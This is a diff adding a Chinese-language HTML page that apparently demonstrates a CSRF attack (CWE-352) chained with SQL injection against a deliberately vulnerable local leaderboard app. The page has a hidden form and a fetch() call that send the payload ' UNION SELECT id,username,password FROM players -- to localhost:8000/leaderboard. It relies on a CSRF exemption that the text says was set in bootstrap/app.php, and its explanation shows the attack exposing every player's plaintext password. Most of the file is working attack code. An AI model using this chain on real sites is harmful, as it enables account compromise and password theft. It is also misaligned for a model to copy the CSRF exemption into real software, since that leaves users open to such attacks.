@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>CWE-352 CSRF 攻击演示</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; padding: 2em; }
+    h2   { color: #ff6b6b; }
+    pre  { background: #2d2d2d; padding: 1em; border-left: 4px solid #ff6b6b; overflow: auto; }
+    .ok  { color: #6bff6b; }
+    .warn{ color: #ffcc00; }
+    button { background: #ff6b6b; color: #fff; border: none; padding: .5em 1.5em;
+             cursor: pointer; font-size: 1em; margin-top: 1em; }
+    #result { margin-top: 1em; }
+  </style>
+</head>
+<body>
+  <h2>⚠ CWE-352 CSRF 攻击演示页</h2>
+  <p class="warn">
+    本页面模拟攻击者站点（evil.com）。<br>
+    受害者访问此页面后，表单将自动向目标站点 <code>POST /leaderboard</code> 发起跨站请求，无需 CSRF Token。
+  </p>
+
+  <h3>攻击一：静默触发 SQL 注入（CSRF + CWE-89）</h3>
+  <pre>
+目标：POST http://localhost:8000/leaderboard
+      name = ' UNION SELECT id,username,password FROM players --
+
+由于 /leaderboard 被加入 CSRF 豁免列表（bootstrap/app.php），
+服务端不校验 Token，跨站 POST 被直接执行。
+  </pre>
+
+  <!--
+    CWE-352 漏洞：该表单提交到 /leaderboard（Web 路由），
+    服务端已在 bootstrap/app.php 中通过 exceptFromCsrf 豁免 CSRF 验证。
+    攻击者页面可构造此表单，受害者打开页面后自动触发。
+  -->
+  <form id="csrfForm"
+        action="http://localhost:8000/leaderboard"
+        method="POST">
+    <input type="hidden" name="name"
+           value="' UNION SELECT id,username,password FROM players -- ">
+  </form>
+
+  <button onclick="submitAndShow()">手动触发 CSRF 请求</button>
+  <button onclick="autoFire()">自动触发（模拟受害者）</button>
+
+  <div id="result"></div>
+
+  <h3>攻击原理说明</h3>
+  <pre>
+1. 攻击者在 evil.com 发布上方 HTML 页面（或嵌入 img/script 标签）
+2. 受害者在已登录目标站的同一浏览器中访问 evil.com
+3. 表单自动提交至 http://localhost:8000/leaderboard（无 CSRF Token）
+4. 服务端豁免了该路由的 CSRF 校验，直接执行 SQL 注入：
+
+   SELECT id, username, balance
+   FROM players
+   WHERE username LIKE '%' UNION SELECT id,username,password FROM players -- %'
+
+5. 查询结果包含所有用户的明文密码，攻击链完成：CSRF → SQL注入 → 数据泄露
+  </pre>
+
+  <script>
+    // fetch 方式触发，显示响应（同源实验环境）
+    function submitAndShow() {
+      const payload = "' UNION SELECT id,username,password FROM players -- ";
+      const form = new FormData();
+      form.append('name', payload);
+
+      fetch('http://localhost:8000/leaderboard', {
+        method: 'POST',
+        body: form,
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('result').innerHTML =
+          '<h3 class="ok">✓ 服务端响应（无 CSRF Token 验证）：</h3>' +
+          '<pre>' + JSON.stringify(data, null, 2) + '</pre>' +
+          '<p class="warn">注意 leaderboard 数组中出现了 password 字段 → SQL 注入 + CSRF 联合攻击成功</p>';
+      })
+      .catch(e => {
+        document.getElementById('result').innerHTML =
+          '<pre style="color:#ff6b6b">请求失败（可能跨域限制）: ' + e + '\n使用表单提交方式测试</pre>';
+      });
+    }
+
+    // 纯表单提交（跨域场景）
+    function autoFire() {
+      document.getElementById('csrfForm').submit();
+    }
+  </script>
+</body>
+</html>
